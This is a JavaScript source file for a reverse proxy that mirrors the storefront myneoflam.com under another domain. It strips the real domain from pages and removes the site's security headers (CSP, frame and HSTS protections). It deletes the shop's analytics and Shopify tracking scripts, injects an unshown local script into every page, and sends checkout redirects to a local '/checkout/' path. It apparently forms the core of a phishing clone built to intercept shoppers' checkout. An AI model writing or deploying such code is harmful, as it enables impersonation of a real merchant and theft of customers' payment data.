import { createProxyMiddleware } from 'http-proxy-middleware';
import fs from 'fs';
import https from 'https';
import zlib from 'zlib';

const TARGET = process.env.TARGET_URL || 'https://myneoflam.com';
const TARGET_ORIGIN = TARGET.replace(/\/$/, '');
const TARGET_HOST = new URL(TARGET).host;

const MAX_SOCKETS = parseInt(process.env.MAX_SOCKETS || '32', 10);
const TIMEOUT_MS = parseInt(process.env.UPSTREAM_TIMEOUT || '120000', 10);

const agent = new https.Agent({ keepAlive: true, maxSockets: MAX_SOCKETS });

const NEOFLAM_HOST_RE = /^myneoflam\.com$/i;
const NEOFLAM_DOMAIN_RE = /(?:https?:)?\/\/(?:www\.)?myneoflam\.com/gi;
const STATIC_RE = /\.(js|mjs|css|woff2?|ttf|otf|eot|png|jpe?g|gif|svg|ico|webp|avif|map)(\?|$)/i;

const CLIENT_INJECT = fs.readFileSync(new URL('./inject.js', import.meta.url), 'utf8')
  .replace(/<\/script/gi, '<\\/script');

const HOP_BY_HOP = new Set([
  'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization',
  'te', 'trailer', 'transfer-encoding', 'upgrade',
]);

const cache = new Map();
const CACHE_MAX = 2000;
const HTML_TTL = 60 * 1000;
const STATIC_TTL = 30 * 60 * 1000;

function cacheGet(key, ttl) {
  const e = cache.get(key);
  if (!e || Date.now() - e.ts > ttl) return null;
  return e.data;
}

function cacheSet(key, data) {
  if (cache.size > CACHE_MAX) cache.delete(cache.keys().next().value);
  cache.set(key, { data, ts: Date.now() });
}

function cleanResponseHeaders(headers) {
  const h = { ...headers };
  for (const k of Object.keys(h)) {
    if (HOP_BY_HOP.has(k.toLowerCase())) delete h[k];
  }
  delete h['content-security-policy'];
  delete h['content-security-policy-report-only'];
  delete h['x-frame-options'];
  delete h['x-content-type-options'];
  delete h['strict-transport-security'];
  delete h['content-length'];
  return h;
}

function decodeBody(buffer, encoding) {
  if (!encoding) return buffer;
  try {
    if (String(encoding).includes('br')) return zlib.brotliDecompressSync(buffer);
    if (String(encoding).includes('gzip')) return zlib.gunzipSync(buffer);
    if (String(encoding).includes('deflate')) return zlib.inflateSync(buffer);
  } catch {}
  return buffer;
}

function rewriteLocation(location) {
  const value = String(location || '');
  if (/checkout\.shopify\.com/i.test(value)) return '/checkout/';
  try {
    const u = new URL(value, TARGET_ORIGIN);
    if (NEOFLAM_HOST_RE.test(u.host) && /^\/checkout(?:\/|\?|$)/i.test(u.pathname)) return '/checkout/';
    if (NEOFLAM_HOST_RE.test(u.host)) return `${u.pathname}${u.search}${u.hash}` || '/';
  } catch {}
  return value.replace(NEOFLAM_DOMAIN_RE, '') || '/';
}

function rewriteStaticHtmlUrls(html) {
  html = html.replace(/(?:https?:)?\/\/(?:www\.)?myneoflam\.com/gi, '');
  html = html.replace(/<script[^>]*\/checkouts\/internal\/preloads\.js[^>]*><\/script>/gi, '');
  return html;
}

function patchHtml(html) {
  html = html.replace(NEOFLAM_DOMAIN_RE, '');
  html = html.replace(/(?:https?:)?\/\/(?:www\.)?myneoflam\.com/gi, '');
  html = rewriteStaticHtmlUrls(html);
  html = html.replace(/<script[^>]*(googletagmanager|google-analytics|gtag|facebook\.net|hotjar|clarity|shopifycloud|monorail|trekkie)[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<link[^>]*manifest["'][^>]*>/gi, '');

  const headPatch = `<base href="/"><script>${CLIENT_INJECT}</script>`;
  if (/<head[^>]*>/i.test(html)) {
    html = html.replace(/<head([^>]*)>/i, (m) => `${m}${headPatch}`);
  } else {
    html = headPatch + html;
  }
  return html;
}

function shouldRewriteHtml(req, ct) {
  if (!ct.includes('text/html')) return false;
  const path = String(req.originalUrl || req.url || '').split('?')[0];
  if (STATIC_RE.test(path)) return false;
  return true;
}

export function createNeoflamProxy() {
  return createProxyMiddleware({
    target: TARGET,
    changeOrigin: true,
    agent,
    timeout: TIMEOUT_MS,
    proxyTimeout: TIMEOUT_MS,
    followRedirects: false,
    selfHandleResponse: true,
    on: {
      proxyReq(proxyReq, req) {
        proxyReq.setHeader('host', TARGET_HOST);
        proxyReq.setHeader('origin', TARGET_ORIGIN);
        proxyReq.setHeader('referer', `${TARGET_ORIGIN}/`);
      },
      proxyRes(proxyRes, req, res) {
        const status = proxyRes.statusCode || 502;
        const location = proxyRes.headers.location;
        if (location && status >= 300 && status < 400) {
          const rewritten = rewriteLocation(location);
          if (rewritten !== location) {
            if (!res.headersSent) {
              res.writeHead(302, { location: rewritten, 'cache-control': 'no-store' });
              res.end();
            }
            return;
          }
        }

        const ct = String(proxyRes.headers['content-type'] || '');
        const ck = `${req.method}:${req.originalUrl || req.url}`;
        const chunks = [];

        proxyRes.on('data', (c) => chunks.push(c));
        proxyRes.on('end', () => {
          if (res.headersSent) return;
          let body = Buffer.concat(chunks);
          const encoding = proxyRes.headers['content-encoding'];
          body = decodeBody(body, encoding);

          if (shouldRewriteHtml(req, ct)) {
            const html = patchHtml(body.toString('utf8'));
            body = Buffer.from(html, 'utf8');
            const h = cleanResponseHeaders(proxyRes.headers);
            delete h['content-encoding'];
            h['content-type'] = 'text/html; charset=utf-8';
            h['content-length'] = String(body.length);
            h['cache-control'] = 'no-cache';
            res.writeHead(status, h);
            res.end(body);
            return;
          }

          const h = cleanResponseHeaders(proxyRes.headers);
          if (encoding) delete h['content-encoding'];
          h['content-length'] = String(body.length);
          res.writeHead(status, h);
          res.end(body);
        });
        proxyRes.on('error', () => {
          if (!res.headersSent) {
            res.writeHead(502, { 'content-type': 'text/plain; charset=utf-8' });
            res.end('upstream error');
          }
        });
      },
      error(err, req, res) {
        if (!res.headersSent) {
          res.writeHead(502, { 'content-type': 'text/plain; charset=utf-8' });
          res.end(`proxy error: ${err.message}`);
        }
      },
    },
  });
}
